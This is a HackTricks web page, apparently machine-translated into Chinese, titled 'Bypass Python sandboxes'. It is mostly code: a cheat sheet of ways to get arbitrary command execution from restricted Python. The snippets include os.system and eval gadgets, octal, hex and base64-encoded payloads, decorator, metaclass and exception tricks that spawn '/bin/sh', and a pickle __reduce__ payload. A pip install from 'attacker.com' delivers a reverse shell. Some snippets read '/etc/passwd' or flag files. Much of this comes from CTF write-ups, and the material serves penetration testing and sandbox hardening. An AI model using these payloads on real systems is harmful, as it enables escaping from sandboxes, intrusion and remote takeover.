<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Bypass Python sandboxes</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="ç»•è¿‡-python-æ²™ç®±"><a class="header" href="#ç»•è¿‡-python-æ²™ç®±">ç»•è¿‡ Python æ²™ç®±</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="../../../.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
<p><strong>ä»é»‘å®¢çš„è§’åº¦å®¡è§†æ‚¨çš„ç½‘ç»œåº”ç”¨ã€ç½‘ç»œå’Œäº‘</strong></p>
<p><strong>æŸ¥æ‰¾å¹¶æŠ¥å‘Šå…·æœ‰å®é™…å•†ä¸šå½±å“çš„å…³é”®å¯åˆ©ç”¨æ¼æ´ã€‚</strong> ä½¿ç”¨æˆ‘ä»¬ 20 å¤šä¸ªè‡ªå®šä¹‰å·¥å…·æ¥æ˜ å°„æ”»å‡»é¢ï¼ŒæŸ¥æ‰¾è®©æ‚¨æå‡æƒé™çš„å®‰å…¨é—®é¢˜ï¼Œå¹¶ä½¿ç”¨è‡ªåŠ¨åŒ–æ¼æ´æ”¶é›†é‡è¦è¯æ®ï¼Œå°†æ‚¨çš„è¾›å‹¤å·¥ä½œè½¬åŒ–ä¸ºæœ‰è¯´æœåŠ›çš„æŠ¥å‘Šã€‚</p>
<p>{% embed url="https://pentest-tools.com/?utm_term=jul2024&amp;utm_medium=link&amp;utm_source=hacktricks&amp;utm_campaign=spons" %}</p>
<p>è¿™äº›æ˜¯ä¸€äº›ç»•è¿‡ Python æ²™ç®±ä¿æŠ¤å¹¶æ‰§è¡Œä»»æ„å‘½ä»¤çš„æŠ€å·§ã€‚</p>
<h2 id="å‘½ä»¤æ‰§è¡Œåº“"><a class="header" href="#å‘½ä»¤æ‰§è¡Œåº“">å‘½ä»¤æ‰§è¡Œåº“</a></h2>
<p>æ‚¨éœ€è¦çŸ¥é“çš„ç¬¬ä¸€ä»¶äº‹æ˜¯ï¼Œæ‚¨æ˜¯å¦å¯ä»¥ç›´æ¥ä½¿ç”¨æŸä¸ªå·²å¯¼å…¥çš„åº“æ‰§è¡Œä»£ç ï¼Œæˆ–è€…æ‚¨æ˜¯å¦å¯ä»¥å¯¼å…¥ä»¥ä¸‹ä»»ä½•åº“ï¼š</p>
<pre><code class="language-python">os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
</code></pre>
<p>è®°ä½ï¼Œ<em><strong>open</strong></em> å’Œ <em><strong>read</strong></em> å‡½æ•°å¯ä»¥ç”¨äº <strong>è¯»å–æ–‡ä»¶</strong> åœ¨ python æ²™ç®±å†…ï¼Œå¹¶ <strong>ç¼–å†™ä¸€äº›ä»£ç </strong> ä½ å¯ä»¥ <strong>æ‰§è¡Œ</strong> æ¥ <strong>ç»•è¿‡</strong> æ²™ç®±ã€‚</p>
<p>{% hint style="danger" %}
<strong>Python2 input()</strong> å‡½æ•°å…è®¸åœ¨ç¨‹åºå´©æºƒä¹‹å‰æ‰§è¡Œ python ä»£ç ã€‚
{% endhint %}</p>
<p>Python å°è¯• <strong>é¦–å…ˆä»å½“å‰ç›®å½•åŠ è½½åº“</strong>ï¼ˆä»¥ä¸‹å‘½ä»¤å°†æ‰“å° python ä»å“ªé‡ŒåŠ è½½æ¨¡å—ï¼‰ï¼š <code>python3 -c 'import sys; print(sys.path)'</code></p>
<p><img src="../../../.gitbook/assets/image%20(559).png" alt="" /></p>
<h2 id="ä½¿ç”¨é»˜è®¤å®‰è£…çš„-python-åŒ…ç»•è¿‡-pickle-æ²™ç®±"><a class="header" href="#ä½¿ç”¨é»˜è®¤å®‰è£…çš„-python-åŒ…ç»•è¿‡-pickle-æ²™ç®±">ä½¿ç”¨é»˜è®¤å®‰è£…çš„ python åŒ…ç»•è¿‡ pickle æ²™ç®±</a></h2>
<h3 id="é»˜è®¤åŒ…"><a class="header" href="#é»˜è®¤åŒ…">é»˜è®¤åŒ…</a></h3>
<p>ä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ° <strong>é¢„å®‰è£…åŒ…çš„åˆ—è¡¨</strong>ï¼š <a href="https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html">https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html</a><br />
è¯·æ³¨æ„ï¼Œä»ä¸€ä¸ª pickle ä¸­ä½ å¯ä»¥ä½¿ python ç¯å¢ƒ <strong>å¯¼å…¥ç³»ç»Ÿä¸­å®‰è£…çš„ä»»æ„åº“</strong>ã€‚<br />
ä¾‹å¦‚ï¼Œä»¥ä¸‹ pickleï¼Œåœ¨åŠ è½½æ—¶ï¼Œå°†å¯¼å…¥ pip åº“ä»¥ä½¿ç”¨å®ƒï¼š</p>
<pre><code class="language-python">#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
def __reduce__(self):
return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
</code></pre>
<p>æœ‰å…³pickleå·¥ä½œåŸç†çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹æ­¤é“¾æ¥: <a href="https://checkoway.net/musings/pickle/">https://checkoway.net/musings/pickle/</a></p>
<h3 id="pipåŒ…"><a class="header" href="#pipåŒ…">PipåŒ…</a></h3>
<p>æŠ€å·§ç”±**@isHaacK**åˆ†äº«</p>
<p>å¦‚æœæ‚¨å¯ä»¥è®¿é—®<code>pip</code>æˆ–<code>pip.main()</code>ï¼Œæ‚¨å¯ä»¥å®‰è£…ä»»æ„åŒ…å¹¶é€šè¿‡è°ƒç”¨è·å¾—åå‘shell:</p>
<pre><code class="language-bash">pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
</code></pre>
<p>æ‚¨å¯ä»¥åœ¨æ­¤å¤„ä¸‹è½½åˆ›å»ºåå‘ shell çš„åŒ…ã€‚è¯·æ³¨æ„ï¼Œåœ¨ä½¿ç”¨ä¹‹å‰ï¼Œæ‚¨åº”è¯¥<strong>è§£å‹ç¼©å®ƒï¼Œä¿®æ”¹ <code>setup.py</code>ï¼Œå¹¶è¾“å…¥æ‚¨çš„åå‘ shell çš„ IP</strong>ï¼š</p>
<p>{% file src="../../../.gitbook/assets/Reverse.tar (1).gz" %}</p>
<p>{% hint style="info" %}
è¿™ä¸ªåŒ…è¢«ç§°ä¸º <code>Reverse</code>ã€‚ç„¶è€Œï¼Œå®ƒæ˜¯ç‰¹åˆ«åˆ¶ä½œçš„ï¼Œä»¥ä¾¿å½“æ‚¨é€€å‡ºåå‘ shell æ—¶ï¼Œå…¶ä½™çš„å®‰è£…å°†å¤±è´¥ï¼Œå› æ­¤æ‚¨<strong>åœ¨ç¦»å¼€æ—¶ä¸ä¼šåœ¨æœåŠ¡å™¨ä¸Šç•™ä¸‹ä»»ä½•é¢å¤–çš„ python åŒ…</strong>ã€‚
{% endhint %}</p>
<h2 id="eval-ing-python-code"><a class="header" href="#eval-ing-python-code">Eval-ing python code</a></h2>
<p>{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œexec å…è®¸å¤šè¡Œå­—ç¬¦ä¸²å’Œâ€œ;â€ï¼Œä½† eval ä¸å…è®¸ï¼ˆæ£€æŸ¥æµ·è±¡è¿ç®—ç¬¦ï¼‰
{% endhint %}</p>
<p>å¦‚æœæŸäº›å­—ç¬¦è¢«ç¦æ­¢ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨<strong>åå…­è¿›åˆ¶/å…«è¿›åˆ¶/B64</strong>è¡¨ç¤ºæ³•æ¥<strong>ç»•è¿‡</strong>é™åˆ¶ï¼š</p>
<pre><code class="language-python">exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '&lt;stdin&gt;', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '&lt;stdin&gt;', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '&lt;stdin&gt;', 'exec'))
</code></pre>
<pre><code class="language-python">#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
</code></pre>
<h3 id="å…¶ä»–å…è®¸è¯„ä¼°-python-ä»£ç çš„åº“"><a class="header" href="#å…¶ä»–å…è®¸è¯„ä¼°-python-ä»£ç çš„åº“">å…¶ä»–å…è®¸è¯„ä¼° Python ä»£ç çš„åº“</a></h3>
<pre><code class="language-python">#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
</code></pre>
<h2 id="æ“ä½œç¬¦å’Œç®€çŸ­æŠ€å·§"><a class="header" href="#æ“ä½œç¬¦å’Œç®€çŸ­æŠ€å·§">æ“ä½œç¬¦å’Œç®€çŸ­æŠ€å·§</a></h2>
<pre><code class="language-python"># walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
</code></pre>
<h2 id="é€šè¿‡ç¼–ç ç»•è¿‡ä¿æŠ¤-utf-7"><a class="header" href="#é€šè¿‡ç¼–ç ç»•è¿‡ä¿æŠ¤-utf-7">é€šè¿‡ç¼–ç ç»•è¿‡ä¿æŠ¤ (UTF-7)</a></h2>
<p>åœ¨ <a href="https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy"><strong>è¿™ç¯‡æ–‡ç« </strong></a> ä¸­ï¼Œä½¿ç”¨ UTF-7 åœ¨ä¸€ä¸ªçœ‹ä¼¼æ²™ç®±çš„ç¯å¢ƒä¸­åŠ è½½å’Œæ‰§è¡Œä»»æ„çš„ python ä»£ç ï¼š</p>
<pre><code class="language-python">assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
return x
#+AAo-print(open("/flag.txt").read())
""".lstrip()
</code></pre>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–ç¼–ç ç»•è¿‡å®ƒï¼Œä¾‹å¦‚ <code>raw_unicode_escape</code> å’Œ <code>unicode_escape</code>ã€‚</p>
<h2 id="æ— è°ƒç”¨çš„-python-æ‰§è¡Œ"><a class="header" href="#æ— è°ƒç”¨çš„-python-æ‰§è¡Œ">æ— è°ƒç”¨çš„ Python æ‰§è¡Œ</a></h2>
<p>å¦‚æœæ‚¨åœ¨ä¸€ä¸ª <strong>ä¸å…è®¸æ‚¨è¿›è¡Œè°ƒç”¨</strong> çš„ python ç›‘ç‹±ä¸­ï¼Œä»ç„¶æœ‰ä¸€äº›æ–¹æ³•å¯ä»¥ <strong>æ‰§è¡Œä»»æ„å‡½æ•°ã€ä»£ç </strong> å’Œ <strong>å‘½ä»¤</strong>ã€‚</p>
<h3 id="ä½¿ç”¨-decorators-çš„-rce"><a class="header" href="#ä½¿ç”¨-decorators-çš„-rce">ä½¿ç”¨ <a href="https://docs.python.org/3/glossary.html#term-decorator">decorators</a> çš„ RCE</a></h3>
<pre><code class="language-python"># From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
pass

# The previous code is equivalent to:
class X:
pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
</code></pre>
<h3 id="rce-åˆ›å»ºå¯¹è±¡å’Œé‡è½½"><a class="header" href="#rce-åˆ›å»ºå¯¹è±¡å’Œé‡è½½">RCE åˆ›å»ºå¯¹è±¡å’Œé‡è½½</a></h3>
<p>å¦‚æœä½ å¯ä»¥ <strong>å£°æ˜ä¸€ä¸ªç±»</strong> å¹¶ <strong>åˆ›å»ºè¯¥ç±»çš„å¯¹è±¡</strong>ï¼Œä½ å¯ä»¥ <strong>ç¼–å†™/è¦†ç›–ä¸åŒçš„æ–¹æ³•</strong>ï¼Œè¿™äº›æ–¹æ³•å¯ä»¥åœ¨ <strong>ä¸éœ€è¦ç›´æ¥è°ƒç”¨å®ƒä»¬</strong> çš„æƒ…å†µä¸‹ <strong>è¢«è§¦å‘</strong>ã€‚</p>
<h4 id="ä½¿ç”¨è‡ªå®šä¹‰ç±»çš„-rce"><a class="header" href="#ä½¿ç”¨è‡ªå®šä¹‰ç±»çš„-rce">ä½¿ç”¨è‡ªå®šä¹‰ç±»çš„ RCE</a></h4>
<p>ä½ å¯ä»¥ä¿®æ”¹ä¸€äº› <strong>ç±»æ–¹æ³•</strong>ï¼ˆ<em>é€šè¿‡è¦†ç›–ç°æœ‰ç±»æ–¹æ³•æˆ–åˆ›å»ºä¸€ä¸ªæ–°ç±»</em>ï¼‰ï¼Œä½¿å®ƒä»¬åœ¨ <strong>è¢«è§¦å‘</strong> æ—¶ <strong>æ‰§è¡Œä»»æ„ä»£ç </strong>ï¼Œè€Œæ— éœ€ç›´æ¥è°ƒç”¨å®ƒä»¬ã€‚</p>
<pre><code class="language-python"># This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
def __init__(self):
self += "print('Hello from __init__ + __iadd__')"
__iadd__ = exec #Triggered when object is created
def __del__(self):
self -= "print('Hello from __del__ + __isub__')"
__isub__ = exec #Triggered when object is created
__getitem__ = exec #Trigerred with obj[&lt;argument&gt;]
__add__ = exec #Triggered with obj + &lt;argument&gt;

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k &lt; 'import os; os.system("sh")')
__le__ (k &lt;= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k &gt;= 'import os; os.system("sh")')
__gt__ (k &gt; 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k&lt;&lt;= 'import os; os.system("sh")')
__irshift__ (k &gt;&gt;= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
</code></pre>
<h4 id="ä½¿ç”¨-metaclasses-åˆ›å»ºå¯¹è±¡"><a class="header" href="#ä½¿ç”¨-metaclasses-åˆ›å»ºå¯¹è±¡">ä½¿ç”¨ <a href="https://docs.python.org/3/reference/datamodel.html#metaclasses">metaclasses</a> åˆ›å»ºå¯¹è±¡</a></h4>
<p>metaclasses å…è®¸æˆ‘ä»¬åšçš„å…³é”®äº‹æƒ…æ˜¯ <strong>åœ¨ä¸ç›´æ¥è°ƒç”¨æ„é€ å‡½æ•°çš„æƒ…å†µä¸‹åˆ›å»ºç±»çš„å®ä¾‹</strong>ï¼Œé€šè¿‡å°†ç›®æ ‡ç±»ä½œä¸º metaclass åˆ›å»ºä¸€ä¸ªæ–°ç±»ã€‚</p>
<pre><code class="language-python"># Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
__getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
</code></pre>
<h4 id="åˆ›å»ºå¸¦æœ‰å¼‚å¸¸çš„å¯¹è±¡"><a class="header" href="#åˆ›å»ºå¸¦æœ‰å¼‚å¸¸çš„å¯¹è±¡">åˆ›å»ºå¸¦æœ‰å¼‚å¸¸çš„å¯¹è±¡</a></h4>
<p>å½“<strong>å¼‚å¸¸è¢«è§¦å‘</strong>æ—¶ï¼Œ<strong>Exception</strong>çš„ä¸€ä¸ªå¯¹è±¡ä¼šè¢«<strong>åˆ›å»º</strong>ï¼Œè€Œæ— éœ€æ‚¨ç›´æ¥è°ƒç”¨æ„é€ å‡½æ•°ï¼ˆæ¥è‡ª<a href="https://mobile.twitter.com/_nag0mez"><strong>@_nag0mez</strong></a>çš„æŠ€å·§ï¼‰ï¼š</p>
<pre><code class="language-python">class RCE(Exception):
def __init__(self):
self += 'import os; os.system("sh")'
__iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
__add__ = exec

try:
raise Klecko
except Klecko as k:
k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
</code></pre>
<h3 id="æ›´å¤š-rce"><a class="header" href="#æ›´å¤š-rce">æ›´å¤š RCE</a></h3>
<pre><code class="language-python"># From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
def __init__(self, a, b, c):
self += "os.system('sh')"
__iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
def __init__(self, a, b, c, d, e):
self += "print(open('flag').read())"
__iadd__ = eval
__builtins__.__import__ = X
{}[1337]
</code></pre>
<h3 id="ä½¿ç”¨å†…ç½®å‡½æ•°è¯»å–æ–‡ä»¶å¸®åŠ©å’Œè®¸å¯è¯"><a class="header" href="#ä½¿ç”¨å†…ç½®å‡½æ•°è¯»å–æ–‡ä»¶å¸®åŠ©å’Œè®¸å¯è¯">ä½¿ç”¨å†…ç½®å‡½æ•°è¯»å–æ–‡ä»¶å¸®åŠ©å’Œè®¸å¯è¯</a></h3>
<pre><code class="language-python">__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
pass
</code></pre>
<h2 id="builtins"><a class="header" href="#builtins">Builtins</a></h2>
<ul>
<li><a href="https://docs.python.org/2/library/functions.html"><strong>Python2 çš„å†…ç½®å‡½æ•°</strong></a></li>
<li><a href="https://docs.python.org/3/library/functions.html"><strong>Python3 çš„å†…ç½®å‡½æ•°</strong></a></li>
</ul>
<p>å¦‚æœä½ å¯ä»¥è®¿é—® <strong><code>__builtins__</code></strong> å¯¹è±¡ï¼Œä½ å¯ä»¥å¯¼å…¥åº“ï¼ˆæ³¨æ„ä½ ä¹Ÿå¯ä»¥åœ¨æœ€åä¸€èŠ‚ä¸­ä½¿ç”¨å…¶ä»–å­—ç¬¦ä¸²è¡¨ç¤ºï¼‰ï¼š</p>
<pre><code class="language-python">__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
</code></pre>
<h3 id="no-builtins"><a class="header" href="#no-builtins">No Builtins</a></h3>
<p>å½“ä½ æ²¡æœ‰ <code>__builtins__</code> æ—¶ï¼Œä½ å°†æ— æ³•å¯¼å…¥ä»»ä½•å†…å®¹ï¼Œç”šè‡³æ— æ³•è¯»å–æˆ–å†™å…¥æ–‡ä»¶ï¼Œå› ä¸º <strong>æ‰€æœ‰çš„å…¨å±€å‡½æ•°</strong>ï¼ˆå¦‚ <code>open</code>ã€<code>import</code>ã€<code>print</code>...ï¼‰<strong>éƒ½æ²¡æœ‰åŠ è½½</strong>ã€‚<br />
ç„¶è€Œï¼Œ<strong>é»˜è®¤æƒ…å†µä¸‹ï¼Œpython ä¼šåœ¨å†…å­˜ä¸­å¯¼å…¥å¾ˆå¤šæ¨¡å—</strong>ã€‚è¿™äº›æ¨¡å—çœ‹ä¼¼æ— å®³ï¼Œä½†å…¶ä¸­ä¸€äº› <strong>ä¹Ÿåœ¨å†…éƒ¨å¯¼å…¥å±é™©</strong> çš„åŠŸèƒ½ï¼Œå¯ä»¥è¢«è®¿é—®ä»¥è·å¾— <strong>ä»»æ„ä»£ç æ‰§è¡Œ</strong>ã€‚</p>
